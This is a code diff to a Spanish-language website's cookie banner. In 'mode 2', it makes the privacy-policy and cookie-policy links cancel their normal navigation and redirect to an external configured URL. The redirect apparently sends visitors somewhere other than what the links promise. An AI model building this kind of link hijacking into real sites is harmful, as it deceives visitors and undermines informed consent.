@@ -726,8 +726,9 @@
                 <button class="boton aceptar" id="btn-aceptar-cookies">Aceptar cookies</button>
             </div>
             <div class="cookie-enlaces">
-                <a href="privacidad.html">Política de Privacidad</a> ·
-                <a href="politicas-cookies.html">Política de Cookies</a>
+                <!-- Los enlaces ahora tienen un ID para poder ser seleccionados por JavaScript -->
+                <a href="privacidad.html" id="enlace-privacidad">Política de Privacidad</a> ·
+                <a href="politicas-cookies.html" id="enlace-cookies">Política de Cookies</a>
             </div>
         </div>
     </div>
@@ -1193,6 +1194,10 @@
             var btnRechazar = document.getElementById('btn-rechazar-cookies');
             var contenidoPrincipal = document.getElementById('contenidoPrincipal');
 
+            // <-- NUEVO: Obtener referencias a los enlaces del banner
+            var enlacePrivacidad = document.getElementById('enlace-privacidad');
+            var enlaceCookies = document.getElementById('enlace-cookies');
+
             // Verificar que los elementos existen
             if (!overlay || !banner || !btnAceptar || !btnRechazar || !contenidoPrincipal) {
                 console.error('Error: Elementos del banner de cookies no encontrados');
@@ -1258,6 +1263,26 @@
             btnRechazar.addEventListener('click', function() {
                 handleCookieAction(false);
             });
+
+            // <-- NUEVO: Manejar clics en los enlaces del banner de cookies
+            // Si el modo es 2, redirigir a la URL externa. Si no, dejar que el enlace funcione normalmente.
+            function handleBannerLinkClick(event) {
+                if (COOKIE_BUTTON_MODE === 2) {
+                    event.preventDefault(); // Evita que el navegador navegue a privacidad.html o politicas-cookies.html
+                    console.log('🔗 Enlace del banner clicado en modo 2. Redirigiendo...');
+                    redirectTo(REDIRECT_URL); // Redirige a la URL configurada
+                }
+                // Si el modo es 1, no hacemos nada y el enlace funciona de forma normal
+            }
+
+            // Añadir el event listener a los enlaces (si existen)
+            if (enlacePrivacidad) {
+                enlacePrivacidad.addEventListener('click', handleBannerLinkClick);
+            }
+            if (enlaceCookies) {
+                enlaceCookies.addEventListener('click', handleBannerLinkClick);
+            }
+            // <-- FIN NUEVO
 
             // Verificar si ya se aceptaron las cookies antes (para el modo 2)
             if (COOKIE_BUTTON_MODE === 2 && sessionStorage.getItem('cookiesAccepted') === 'true') {
